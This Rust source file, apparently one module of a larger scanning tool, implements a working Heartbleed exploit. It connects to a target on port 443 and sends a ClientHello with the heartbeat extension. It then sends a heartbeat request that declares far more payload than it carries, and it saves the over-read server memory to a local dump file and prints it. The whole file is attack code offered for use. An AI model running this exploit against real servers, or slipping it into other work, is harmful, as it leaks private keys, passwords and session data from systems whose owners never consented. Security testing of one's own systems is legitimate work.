use anyhow::{Context, Result};
use std::fs::File;
use std::io::Write;
use std::net::ToSocketAddrs;
use std::path::Path;
use std::time::{SystemTime, UNIX_EPOCH};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::time::{timeout, Duration};

/// Entry point for dispatcher â€“ uses default port 443
pub async fn run(target: &str) -> Result<()> {
    run_with_port(target, 443).await
}

/// Full Heartbleed scanner with user-defined port (used internally)
pub async fn run_with_port(target: &str, port: u16) -> Result<()> {
    println!("[*] Connecting to {}:{}...", target, port);
    let addr = format!("{}:{}", target, port);
    let socket_addr = addr
        .to_socket_addrs()
        .context("Invalid target address format")?
        .next()
        .context("Could not resolve target address")?;

    let stream_result = timeout(Duration::from_secs(5), TcpStream::connect(socket_addr)).await;
    let mut stream = match stream_result {
        Ok(Ok(s)) => s,
        Ok(Err(e)) => {
            println!("[-] Connection to {} failed: {}", socket_addr, e);
            return Ok(());
        }
        Err(_) => {
            println!("[-] Connection to {} timed out", socket_addr);
            return Ok(());
        }
    };

    println!("[*] Sending Client Hello...");
    stream.write_all(&build_client_hello()).await?;

    let mut response = vec![0u8; 4096];
    let read_result = timeout(Duration::from_secs(5), stream.read(&mut response)).await;
    match read_result {
        Ok(Ok(n)) if n > 0 => {},
        Ok(Ok(_)) => {
            println!("[-] No response to Client Hello");
            return Ok(());
        }
        Ok(Err(e)) => {
            println!("[-] Read error: {}", e);
            return Ok(());
        }
        Err(_) => {
            println!("[-] Read timed out (Client Hello response)");
            return Ok(());
        }
    }

    println!("[*] Sending Heartbeat...");
    stream.write_all(&build_heartbeat_request(0x4000)).await?;

    let mut leak = vec![0u8; 65535];
    let read_result = timeout(Duration::from_secs(5), stream.read(&mut leak)).await;
    let n = match read_result {
        Ok(Ok(n)) if n > 0 => n,
        Ok(Ok(_)) => {
            println!("[-] No heartbeat response.");
            return Ok(());
        }
        Ok(Err(e)) => {
            println!("[-] Read error: {}", e);
            return Ok(());
        }
        Err(_) => {
            println!("[-] Read timed out (heartbeat response)");
            return Ok(());
        }
    };

    println!("[+] Received {} bytes in heartbeat response!", n);
    let filename = format!("leak_dump_{}.bin", target.replace(":", "_"));
    let path = Path::new(&filename);
    let mut file = File::create(path)
        .with_context(|| format!("Failed to create dump file '{}'", filename))?;
    file.write_all(&leak[..n])
        .with_context(|| format!("Failed to write leak data to '{}'", filename))?;
    println!("[+] Leak dump saved to: {}", filename);
    println!("{}", printable_dump(&leak[..n]));

    Ok(())
}

/// Builds a TLS ClientHello message
fn build_client_hello() -> Vec<u8> {
    let version: u16 = 0x0302; // TLS 1.1
    let time_now = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs() as u32;

    let mut random = vec![];
    random.extend_from_slice(&time_now.to_be_bytes());
    random.extend_from_slice(&vec![0x42; 28]);

    let cipher_suites: Vec<u16> = vec![
        0xC014, 0x0035, 0x002F, 0x000A, 0x0005, 0x0004, 0x0003, 0x0002, 0x0001,
    ];

    let mut hello = vec![];
    hello.extend_from_slice(&version.to_be_bytes());
    hello.extend_from_slice(&random);
    hello.push(0); // Session ID length
    hello.extend_from_slice(&(cipher_suites.len() as u16 * 2).to_be_bytes());
    for cs in &cipher_suites {
        hello.extend_from_slice(&cs.to_be_bytes());
    }
    hello.push(1); // Compression methods length
    hello.push(0); // No compression

    let mut extensions = vec![];
    extensions.extend_from_slice(&0x000f_u16.to_be_bytes());
    extensions.extend_from_slice(&0x0001_u16.to_be_bytes());
    extensions.push(0x01); // Extension data

    hello.extend_from_slice(&(extensions.len() as u16).to_be_bytes());
    hello.extend_from_slice(&extensions);

    let mut handshake = vec![0x01];
    let len = (hello.len() as u32).to_be_bytes();
    handshake.extend_from_slice(&len[1..]);
    handshake.extend_from_slice(&hello);

    build_tls_record(0x16, version, &handshake)
}

/// Builds a malicious Heartbeat request
fn build_heartbeat_request(length: u16) -> Vec<u8> {
    let mut payload = vec![0x01, (length >> 8) as u8, length as u8];
    payload.extend_from_slice(&[0x42, 0x42, 0x42, 0x42, 0x42]);
    build_tls_record(0x18, 0x0302, &payload)
}

/// Wraps payload in a TLS record
fn build_tls_record(record_type: u8, version: u16, payload: &[u8]) -> Vec<u8> {
    let mut record = vec![record_type];
    record.extend_from_slice(&version.to_be_bytes());
    record.extend_from_slice(&(payload.len() as u16).to_be_bytes());
    record.extend_from_slice(payload);
    record
}

/// Converts binary leak to printable ASCII
fn printable_dump(data: &[u8]) -> String {
    data.iter()
        .map(|b| match *b {
            32..=126 => *b as char,
            b'\n' | b'\r' | b'\t' => ' ',
            _ => '.',
        })
        .collect()
}
